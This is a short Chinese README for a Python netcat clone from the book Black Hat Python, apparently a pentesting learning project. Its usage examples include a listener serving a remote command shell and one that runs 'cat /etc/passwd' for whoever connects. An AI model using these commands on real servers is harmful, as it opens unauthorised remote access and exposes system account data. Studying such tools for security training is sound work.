# simulation_netcat

日常攻防中，如果遇到没有安装netcat，却有python环境的服务器。

在这种情况下，要是能创建一个简单的网络客户端和服务端用来传送文件、远程执行命令，则大有用武之地。

源码99+均来自书中原样式，对少数bug进行修改但未完全实现完美好用。

[![img](https://camo.githubusercontent.com/9720111972806b0d6aa749d577980c88e1ae700828471da7091018065108afdd/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d4578704c616e67636e)](https://camo.githubusercontent.com/9720111972806b0d6aa749d577980c88e1ae700828471da7091018065108afdd/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d4578704c616e67636e)

------

🐍前言

案例来自《python黑帽子黑客与渗透测试编程之道》，翻译是大神@Gh0u1L5，腾讯玄武实验室安全研究员

书中一共24个实验，第一个实验（取代netcat），谈不上取代，只能说模拟。顾称simulation_netcat

💖环境

Win测试环境+kali测试环境+Ubuntu测试环境+pycharm开发环境

🎨简介

netcat俗称瑞士军刀，小巧灵活，牛逼plus，文件传输、反弹shell无所不能

🎄实例

- 查看帮助

```
python3 netcat.py --help
```

![image-20221230001426983](https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212300014203.png)

- 反弹shell

```
python3 netcat.py -t 192.168.31.19 -p 3333 -l -c
```

![image-20221230001532776](https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212300015869.png)

- 执行命令

```
python3 netcat.py -t 192.168.31.19 -p 3333 -l -e="cat /etc/passwd"
```

![image-20221230001658839](https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212300016983.png)

- nc融合

可作为服务端，客户端用原版nc同样可连接

```
nc 192.168.31.19 3333
```

![image-20221230001944498](https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212300019544.png)

- 问题

传输文件请用原版nc作为客户端

Linux-Linux测试成功

Windows-Linux测试成功

- 若遇到socket抛出的OSError: [Errno 99] Cannot assign requested address报错请自行google

